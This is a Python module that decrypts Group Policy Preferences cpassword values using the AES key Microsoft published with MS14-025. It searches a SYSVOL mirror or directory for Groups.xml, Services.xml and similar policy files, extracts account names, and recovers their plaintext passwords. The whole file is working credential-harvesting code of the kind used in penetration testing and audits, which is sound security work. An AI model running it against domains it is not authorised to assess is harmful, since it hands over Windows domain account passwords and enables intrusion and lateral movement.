"""Group Policy Preferences cpassword decryption.

The AES-256 key was published by Microsoft in MS14-025 remediation guidance;
Groups.xml / Services.xml / ScheduledTasks / DataSources / Drives / Printers
files created before the 2014 patch commonly contain a cpassword attribute.
"""

from __future__ import annotations

import base64
import re
from collections.abc import Iterator
from pathlib import Path

# Public AES-256 key disclosed by Microsoft (MS14-025).
GPP_KEY = bytes.fromhex("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
GPP_IV = b"\x00" * 16

GPP_FILENAMES = {
    "Groups.xml",
    "Services.xml",
    "ScheduledTasks.xml",
    "DataSources.xml",
    "Drives.xml",
    "Printers.xml",
}

CPASSWORD_RE = re.compile(r'cpassword="([^"]+)"')
USER_RE = re.compile(r'(?:userName|runAs|accountName|username)="([^"]+)"', re.IGNORECASE)


def decrypt_cpassword(cpassword: str) -> str:
    """Decrypt a GPP cpassword blob to plaintext.

    Raises ValueError when the payload cannot be decrypted.
    """
    if not cpassword:
        raise ValueError("empty cpassword")
    try:
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    except ImportError as exc:
        raise RuntimeError("gpp decryption requires cryptography") from exc

    padded = cpassword + "=" * (-len(cpassword) % 4)
    try:
        raw = base64.b64decode(padded)
    except Exception as exc:
        raise ValueError(f"invalid base64 cpassword: {exc}") from exc

    cipher = Cipher(algorithms.AES(GPP_KEY), modes.CBC(GPP_IV))
    decryptor = cipher.decryptor()
    plaintext_padded = decryptor.update(raw) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    plaintext = unpadder.update(plaintext_padded) + unpadder.finalize()
    return plaintext.decode("utf-16-le")


def iter_gpp_files(root: Path) -> Iterator[Path]:
    """Walk a SYSVOL mirror or local directory for GPP files of interest."""
    for path in root.rglob("*"):
        if path.is_file() and path.name in GPP_FILENAMES:
            yield path


def parse_gpp_file(path: Path) -> list[dict[str, str]]:
    """Extract (username, cpassword, plaintext) records from a GPP XML file."""
    try:
        text = path.read_text(encoding="utf-8", errors="replace")
    except OSError as exc:
        return [{"file": str(path), "error": str(exc)}]

    users = USER_RE.findall(text)
    results: list[dict[str, str]] = []
    for i, cpwd in enumerate(CPASSWORD_RE.findall(text)):
        entry: dict[str, str] = {"file": str(path), "cpassword": cpwd}
        if i < len(users):
            entry["username"] = users[i]
        try:
            entry["plaintext"] = decrypt_cpassword(cpwd)
        except (ValueError, RuntimeError) as exc:
            entry["error"] = str(exc)
        results.append(entry)
    return results
